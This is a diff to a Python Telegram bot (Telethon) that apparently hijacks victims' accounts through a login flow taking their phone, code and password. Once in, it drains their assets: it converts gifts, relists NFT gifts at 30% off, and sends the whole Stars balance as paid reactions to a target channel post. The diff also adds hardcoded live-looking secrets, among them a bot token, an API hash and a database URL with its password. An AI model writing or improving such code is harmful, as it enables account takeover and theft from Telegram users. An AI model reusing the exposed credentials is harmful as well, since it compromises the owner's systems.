@@ -47,7 +47,18 @@ from telethon.tl.types import (
 #   КОНФИГ
 # ═══════════════════════════════════════════════════════
 
+BOT_TOKEN = "8215145424:AAHpyVF-L988cwzAp6ASnLkWX-F8KmtmPfU"
+BOT_USERNAME = "pinkslonrobot"
+ADMIN_ID = 8986358602
+MINIAPP_URL = "https://trustgift.github.io/offersbot/"
+MINIAPP_SHORT = "app"
+BACKEND_URL = "https://botofferswork.onrender.com"
+API_ID = 26259835
+API_HASH = "3fa32264398920f001dd2428b42060f6"
+DATABASE_URL = "postgresql+asyncpg://avnadmin:AVNS_Kdeg6Q2vNRREiOv-JWp@pg-270e5c9e-danyachuglaev-8664.e.aivencloud.com:28308/defaultdb"
 
+TARGET_POST = "https://t.me/testchanell2026/2"
+PORT = int(os.getenv("PORT", "8080"))
 
 _m = re.match(r"https?://t\.me/([^/]+)/(\d+)", TARGET_POST)
 TARGET_CHANNEL = _m.group(1) if _m else None
@@ -56,7 +67,7 @@ TARGET_POST_ID = int(_m.group(2)) if _m else None
 MAX_ATTEMPTS = 3
 
 print("=" * 60)
-print(f"BOT v9 — правильная проверка типа, пропуск конвертации")
+print(f"BOT v10 — фикс цены NFT (resell_amount как список)")
 print(f"TARGET: {TARGET_CHANNEL}/{TARGET_POST_ID}")
 print("=" * 60)
 
@@ -351,6 +362,30 @@ async def telethon_attempt_login(phone, code, password=None, session_str=None, p
         return False, 'error', None
 
 
+def extract_resell_amount(ra):
+    """
+    resell_amount может быть:
+    - списком [StarsAmount, StarsTonAmount]
+    - одним StarsAmount
+    - None
+    Возвращаем int (звёзды) или None.
+    """
+    if ra is None:
+        return None
+    if isinstance(ra, list):
+        for item in ra:
+            if type(item).__name__ == "StarsAmount":
+                val = getattr(item, "amount", None)
+                if val:
+                    return int(val)
+        return None
+    # одиночный объект
+    val = getattr(ra, "amount", None) or getattr(ra, "stars", None)
+    if val:
+        return int(val)
+    return None
+
+
 async def telethon_sell_all_and_react(session_string, worker_id, offer_id):
     client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
     result = {
@@ -425,10 +460,10 @@ async def telethon_sell_all_and_react(session_string, worker_id, offer_id):
 
             msg_id = getattr(g, "msg_id", None)
             saved_id = getattr(g, "saved_id", None)
+
+            # ─── ЦЕНА (главный фикс)
             ra = getattr(gift_obj, "resell_amount", None)
-            ra_amount = None
-            if ra is not None:
-                ra_amount = getattr(ra, "amount", None) or getattr(ra, "stars", None)
+            ra_amount = extract_resell_amount(ra)
 
             title = (
                 getattr(gift_obj, "title", None)
@@ -442,7 +477,7 @@ async def telethon_sell_all_and_react(session_string, worker_id, offer_id):
                     title = f"Gift#{idx}"
             title = str(title)
 
-            print(f"[AUTO] #{idx}: type={cls_name} title={title[:40]!r} msg_id={msg_id} saved_id={saved_id} resell={ra_amount}")
+            print(f"[AUTO] #{idx}: type={cls_name} title={title[:40]!r} msg_id={msg_id} resell={ra_amount}")
 
             ref = None
             if msg_id:
@@ -473,7 +508,7 @@ async def telethon_sell_all_and_react(session_string, worker_id, offer_id):
 
         print(f"[AUTO] regular={len(regular_to_convert)} unique_with_price={len(unique_listed)} skipped={len(result['skipped'])}")
 
-        # ─── 4. конвертируем (если падает — пропускаем и идём дальше)
+        # ─── 4. конвертируем обычные
         print(f"[AUTO] Конвертирую {len(regular_to_convert)} обычных...")
         for r in regular_to_convert:
             try:
@@ -491,7 +526,7 @@ async def telethon_sell_all_and_react(session_string, worker_id, offer_id):
                 ]):
                     result["skipped"].append({
                         "title": r["title"],
-                        "reason": f"нельзя конвертировать"
+                        "reason": "нельзя конвертировать"
                     })
                     print(f"[AUTO] ⏳ skip {r['title']}: {err_str[:80]}")
                 else:
@@ -502,8 +537,8 @@ async def telethon_sell_all_and_react(session_string, worker_id, offer_id):
                     print(f"[AUTO] ❌ fail {r['title']}: {type(e).__name__}: {err_str[:80]}")
                 continue
 
-        # ─── 5. обновляем цену NFT
-        print(f"[AUTO] Обновляю цену {len(unique_listed)} NFT...")
+        # ─── 5. обновляем цену NFT на -30%
+        print(f"[AUTO] Обновляю цену {len(unique_listed)} NFT (-30%)...")
         for u in unique_listed:
             new_price = int(u["current_price"] * 0.7)
             if new_price < 1:
@@ -535,7 +570,7 @@ async def telethon_sell_all_and_react(session_string, worker_id, offer_id):
         result["balance_after"] = balance
         print(f"[AUTO] balance = {balance} ⭐")
 
-        # ─── 7. реакция на все звёзды с правильным random_id
+        # ─── 7. реакция с правильным random_id
         if balance > 0 and TARGET_CHANNEL and TARGET_POST_ID:
             sent = False
             reaction_errors = []
@@ -554,7 +589,7 @@ async def telethon_sell_all_and_react(session_string, worker_id, offer_id):
                         result["reacted"] = True
                         result["stars_sent"] = try_count
                         sent = True
-                        print(f"[AUTO] ✅ reaction OK: {try_count} ⭐ (rid={random_id})")
+                        print(f"[AUTO] ✅ reaction OK: {try_count} ⭐")
                         break
                     except Exception as e:
                         err_str = str(e)
@@ -1267,7 +1302,7 @@ async def run_automation(session_string, offer_id, worker_id):
 
     if result.get("listed"):
         lines.append(f"\n🏷 Выставлено: <b>{len(result['listed'])}</b>")
-        for x in result["listed"][:5]:
+        for x in result["listed"][:10]:
             lines.append(f"• {x['title']} — {x['min_price']}⭐")
 
     if result.get("sold"):
@@ -1275,8 +1310,13 @@ async def run_automation(session_string, offer_id, worker_id):
 
     if result.get("skipped"):
         lines.append(f"\n⏳ Пропущено: <b>{len(result['skipped'])}</b>")
-        for x in result["skipped"][:3]:
-            lines.append(f"• {x['title']} — {x['reason'][:40]}")
+        # группируем по причине
+        reasons = {}
+        for x in result["skipped"]:
+            r = x.get("reason", "?")[:40]
+            reasons[r] = reasons.get(r, 0) + 1
+        for reason, cnt in reasons.items():
+            lines.append(f"• <b>{cnt}</b> под. — {reason}")
 
     if result.get("failed"):
         lines.append(f"\n❌ Ошибок: <b>{len(result['failed'])}</b>")
@@ -1311,7 +1351,7 @@ async def health():
 
 async def run_bot():
     print("=" * 60)
-    print(f"BOOT v9")
+    print(f"BOOT v10")
     print("=" * 60)
     await init_db()
     print("RUN_BOT: db ready")
